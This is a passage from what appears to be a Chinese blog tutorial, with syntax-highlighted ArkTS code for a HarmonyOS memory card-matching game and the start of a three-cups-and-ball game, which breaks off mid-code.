animationTime, <span class="comment">// 动画持续时间</span></span><br><span class="line">      <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// 动画迭代次数</span></span><br><span class="line">      <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// 动画曲线类型</span></span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line">        <span class="title function_">animateToImmediately</span>(&#123; <span class="comment">// 再次开始动画</span></span><br><span class="line">          <span class="attr">duration</span>: animationTime, <span class="comment">// 动画持续时间</span></span><br><span class="line">          <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// 动画迭代次数</span></span><br><span class="line">          <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// 动画曲线类型</span></span><br><span class="line">          <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isFrontVisible</span> = <span class="literal">true</span>; <span class="comment">// 设置卡片为正面朝上</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// 设置动画状态为停止</span></span><br><span class="line">            <span class="keyword">if</span> (callback) &#123; <span class="comment">// 如果有回调函数，则执行</span></span><br><span class="line">              <span class="title function_">callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画开始时的回调</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">isVisible</span> = <span class="literal">true</span>; <span class="comment">// 设置卡片为可见</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">0</span>; <span class="comment">// 设置旋转角度为0</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画开始时的回调</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isVisible</span> = <span class="literal">false</span>; <span class="comment">// 设置卡片为不可见</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">90</span>; <span class="comment">// 设置旋转角度为90度</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 重置卡片状态的方法</span></span><br><span class="line">  <span class="title function_">reset</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVisible</span> = <span class="literal">false</span>; <span class="comment">// 设置卡片为不可见</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">180</span>; <span class="comment">// 设置旋转角度为180度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isFrontVisible</span> = <span class="literal">false</span>; <span class="comment">// 设置卡片为背面朝上</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// 设置动画状态为停止</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isMatched</span> = <span class="literal">false</span>; <span class="comment">// 设置卡片为未匹配</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 隐藏卡片正面的方法</span></span><br><span class="line">  <span class="title function_">hideFace</span>(<span class="params">animationTime: number, callback?: () =&gt; <span class="keyword">void</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimationRunning</span>) &#123; <span class="comment">// 如果已经有动画在运行，则返回</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">true</span>; <span class="comment">// 设置动画状态为运行中</span></span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123; <span class="comment">// 开始动画</span></span><br><span class="line">      <span class="attr">duration</span>: animationTime, <span class="comment">// 动画持续时间</span></span><br><span class="line">      <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// 动画迭代次数</span></span><br><span class="line">      <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// 动画曲线类型</span></span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line">        <span class="title function_">animateToImmediately</span>(&#123; <span class="comment">// 再次开始动画</span></span><br><span class="line">          <span class="attr">duration</span>: animationTime, <span class="comment">// 动画持续时间</span></span><br><span class="line">          <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// 动画迭代次数</span></span><br><span class="line">          <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// 动画曲线类型</span></span><br><span class="line">          <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isFrontVisible</span> = <span class="literal">false</span>; <span class="comment">// 设置卡片为背面朝上</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// 设置动画状态为停止</span></span><br><span class="line">            <span class="keyword">if</span> (callback) &#123; <span class="comment">// 如果有回调函数，则执行</span></span><br><span class="line">              <span class="title function_">callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画开始时的回调</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">isVisible</span> = <span class="literal">false</span>; <span class="comment">// 设置卡片为不可见</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">180</span>; <span class="comment">// 设置旋转角度为180度</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画开始时的回调</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isVisible</span> = <span class="literal">true</span>; <span class="comment">// 设置卡片为可见</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">90</span>; <span class="comment">// 设置旋转角度为90度</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义组件入口</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">MemoryGame</span> &#123; <span class="comment">// 定义游戏组件</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">gameCells</span>: <span class="title class_">GameCell</span>[] = []; <span class="comment">// 存储游戏中的所有单元格</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellSize</span>: number = <span class="number">150</span>; <span class="comment">// 单元格的大小</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellSpacing</span>: number = <span class="number">5</span>; <span class="comment">// 单元格之间的间距</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">transitionDuration</span>: number = <span class="number">150</span>; <span class="comment">// 过渡动画的持续时间</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">firstSelectedIndex</span>: number | <span class="literal">null</span> = <span class="literal">null</span>; <span class="comment">// 记录第一次选择的卡片索引</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">secondSelectedIndex</span>: number | <span class="literal">null</span> = <span class="literal">null</span>; <span class="comment">// 记录第二次选择的卡片索引</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isGameOver</span>: boolean = <span class="literal">false</span>; <span class="comment">// 游戏是否结束</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">startTime</span>: number = <span class="number">0</span>; <span class="comment">// 游戏开始时间</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123; <span class="comment">// 组件即将显示时触发</span></span><br><span class="line">    <span class="keyword">let</span> <span class="attr">cardValues</span>: string[] = [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>]; <span class="comment">// 定义卡片的值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> cardValues) &#123; <span class="comment">// 遍历卡片值</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">GameCell</span>(value)); <span class="comment">// 添加到游戏单元格数组中</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">GameCell</span>(value)); <span class="comment">// 每个值添加两次以形成对</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">shuffleCards</span>(); <span class="comment">// 洗牌</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 洗牌方法</span></span><br><span class="line">  <span class="title function_">shuffleCards</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> = <span class="literal">null</span>; <span class="comment">// 清除第一次选择索引</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> = <span class="literal">null</span>; <span class="comment">// 清除第二次选择索引</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">false</span>; <span class="comment">// 游戏未结束</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">startTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>(); <span class="comment">// 设置游戏开始时间为当前时间</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; <span class="comment">// 重置所有单元格状态</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCells</span>[i].<span class="title function_">reset</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="variable language_">this</span>.<span class="property">gameCells</span>.<span class="property">length</span> - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123; <span class="comment">// 洗牌算法</span></span><br><span class="line">      <span class="keyword">const</span> randomIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (i + <span class="number">1</span>)); <span class="comment">// 随机索引</span></span><br><span class="line">      <span class="keyword">let</span> tempValue = <span class="variable language_">this</span>.<span class="property">gameCells</span>[i].<span class="property">value</span>; <span class="comment">// 临时保存值</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCells</span>[i].<span class="property">value</span> = <span class="variable language_">this</span>.<span class="property">gameCells</span>[randomIndex].<span class="property">value</span>; <span class="comment">// 交换值</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCells</span>[randomIndex].<span class="property">value</span> = tempValue; <span class="comment">// 交换值</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查卡片是否匹配的方法</span></span><br><span class="line">  <span class="title function_">checkForMatch</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> !== <span class="literal">null</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> !== <span class="literal">null</span>) &#123; <span class="comment">// 确保两个索引都不为空</span></span><br><span class="line">      <span class="keyword">const</span> firstCell = <span class="variable language_">this</span>.<span class="property">gameCells</span>[<span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span>]; <span class="comment">// 获取第一个选中的单元格</span></span><br><span class="line">      <span class="keyword">const</span> secondCell = <span class="variable language_">this</span>.<span class="property">gameCells</span>[<span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span>]; <span class="comment">// 获取第二个选中的单元格</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (firstCell.<span class="property">value</span> === secondCell.<span class="property">value</span>) &#123; <span class="comment">// 如果两个单元格的值相同</span></span><br><span class="line">        firstCell.<span class="property">isMatched</span> = <span class="literal">true</span>; <span class="comment">// 标记为已匹配</span></span><br><span class="line">        secondCell.<span class="property">isMatched</span> = <span class="literal">true</span>; <span class="comment">// 标记为已匹配</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> = <span class="literal">null</span>; <span class="comment">// 清除第一次选择索引</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> = <span class="literal">null</span>; <span class="comment">// 清除第二次选择索引</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">gameCells</span>.<span class="title function_">every</span>(<span class="function"><span class="params">cell</span> =&gt;</span> cell.<span class="property">isMatched</span>)) &#123; <span class="comment">// 如果所有单元格都已匹配</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">true</span>; <span class="comment">// 游戏结束</span></span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;游戏结束&quot;</span>); <span class="comment">// 打印信息</span></span><br><span class="line">          promptAction.<span class="title function_">showDialog</span>(&#123; <span class="comment">// 显示对话框</span></span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;游戏胜利！&#x27;</span>, <span class="comment">// 对话框标题</span></span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;恭喜你，用时：&#x27;</span> + ((<span class="title class_">Date</span>.<span class="title function_">now</span>() - <span class="variable language_">this</span>.<span class="property">startTime</span>) / <span class="number">1000</span>).<span class="title function_">toFixed</span>(<span class="number">3</span>) + <span class="string">&#x27;秒&#x27;</span>, <span class="comment">// 对话框消息</span></span><br><span class="line">            <span class="attr">buttons</span>: [&#123; <span class="attr">text</span>: <span class="string">&#x27;重新开始&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span> &#125;] <span class="comment">// 对话框按钮</span></span><br><span class="line">          &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 对话框关闭后执行</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">shuffleCards</span>(); <span class="comment">// 重新开始游戏</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果两个单元格的值不同</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 延迟一段时间后</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> !== <span class="literal">null</span>) &#123; <span class="comment">// 如果第一个索引不为空</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">gameCells</span>[<span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span>].<span class="title function_">hideFace</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>, <span class="function">() =&gt;</span> &#123; <span class="comment">// 隐藏卡片</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> = <span class="literal">null</span>; <span class="comment">// 清除第一次选择索引</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> !== <span class="literal">null</span>) &#123; <span class="comment">// 如果第二个索引不为空</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">gameCells</span>[<span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span>].<span class="title function_">hideFace</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>, <span class="function">() =&gt;</span> &#123; <span class="comment">// 隐藏卡片</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> = <span class="literal">null</span>; <span class="comment">// 清除第二次选择索引</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="number">400</span>); <span class="comment">// 延迟时间</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 构建游戏界面的方法</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123; <span class="comment">// 创建一个垂直布局</span></span><br><span class="line">      <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123; <span class="comment">// 创建一个可换行的弹性布局</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">gameCells</span>, <span class="function">(<span class="params">gameCell: GameCell, index: number</span>) =&gt;</span> &#123; <span class="comment">// 遍历游戏单元格</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;gameCell.isVisible ? gameCell.value : <span class="string">&#x27;&#x27;</span>&#125;</span>`</span>) <span class="comment">// 显示单元格的值或空字符串</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>) <span class="comment">// 设置高度</span></span><br><span class="line">            .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSpacing&#125;</span>lpx`</span>) <span class="comment">// 设置边距</span></span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// 设置字体大小</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>) <span class="comment">// 文本居中</span></span><br><span class="line">            .<span class="title function_">backgroundColor</span>(gameCell.<span class="property">isVisible</span> ? <span class="title class_">Color</span>.<span class="property">Orange</span> : <span class="title class_">Color</span>.<span class="property">Gray</span>) <span class="comment">// 设置背景颜色</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">            .<span class="title function_">rotate</span>(&#123; <span class="comment">// 设置旋转</span></span><br><span class="line">              <span class="attr">x</span>: <span class="number">0</span>,</span><br><span class="line">              <span class="attr">y</span>: <span class="number">1</span>,</span><br><span class="line">              <span class="attr">z</span>: <span class="number">0</span>,</span><br><span class="line">              <span class="attr">angle</span>: gameCell.<span class="property">rotationAngle</span>, <span class="comment">// 旋转角度</span></span><br><span class="line">              <span class="attr">centerX</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>, <span class="comment">// 中心点X坐标</span></span><br><span class="line">              <span class="attr">centerY</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>, <span class="comment">// 中心点Y坐标</span></span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 单击事件处理</span></span><br><span class="line">              <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isGameOver</span>) &#123; <span class="comment">// 如果游戏已结束</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;游戏已结束&quot;</span>); <span class="comment">// 打印信息</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (gameCell.<span class="property">isMatched</span>) &#123; <span class="comment">// 如果单元格已匹配</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;当前已标记&quot;</span>); <span class="comment">// 打印信息</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> == <span class="literal">null</span>) &#123; <span class="comment">// 如果没有第一次选择</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> = index; <span class="comment">// 设置第一次选择索引</span></span><br><span class="line">                <span class="keyword">if</span> (!gameCell.<span class="property">isFrontVisible</span>) &#123; <span class="comment">// 如果不是正面朝上</span></span><br><span class="line">                  gameCell.<span class="title function_">revealFace</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>); <span class="comment">// 展示正面</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> == index) &#123; <span class="comment">// 如果与第一次选择相同</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;和上一次点击的是一样的，不予处理&quot;</span>); <span class="comment">// 打印信息</span></span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> == <span class="literal">null</span>) &#123; <span class="comment">// 如果没有第二次选择</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> = index; <span class="comment">// 设置第二次选择索引</span></span><br><span class="line">                <span class="keyword">if</span> (!gameCell.<span class="property">isFrontVisible</span>) &#123; <span class="comment">// 如果不是正面朝上</span></span><br><span class="line">                  gameCell.<span class="title function_">revealFace</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>, <span class="function">() =&gt;</span> &#123; <span class="comment">// 展示正面</span></span><br><span class="line">                    <span class="variable language_">this</span>.<span class="title function_">checkForMatch</span>(); <span class="comment">// 检查是否匹配</span></span><br><span class="line">                  &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellSpacing * <span class="number">2</span>) * <span class="number">4</span>&#125;</span>lpx`</span>); <span class="comment">// 设置宽度</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;重新开始&#x27;</span>) <span class="comment">// 创建“重新开始”按钮</span></span><br><span class="line">        .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 按钮点击事件</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">shuffleCards</span>(); <span class="comment">// 重新开始游戏</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;.<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// 设置高度和宽度</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3cup-ball"><a href="#3cup-ball" class="headerlink" title="3cup  ball"></a>3cup  ball</h1><p>三杯猜球</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用装饰器来追踪对象的变化</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cup</span> &#123;</span><br><span class="line">  <span class="comment">// 使用装饰器来追踪属性的变化</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">positionX</span>: number; <span class="comment">// 杯子的X轴位置</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">positionY</span>: number; <span class="comment">// 杯子的Y轴位置</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">containsBall</span>: boolean; <span class="comment">// 杯子内是否有球</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">isRevealed</span>: boolean; <span class="comment">// 杯子是否打开</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构造函数初始化杯子的状态</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">hasBall: boolean</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">positionX</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">positionY</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">containsBall</span> = hasBall;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isRevealed</span> = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 游戏入口组件</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">ThreeCupGame</span> &#123;</span><br><span class="line">  <span class="comment">// 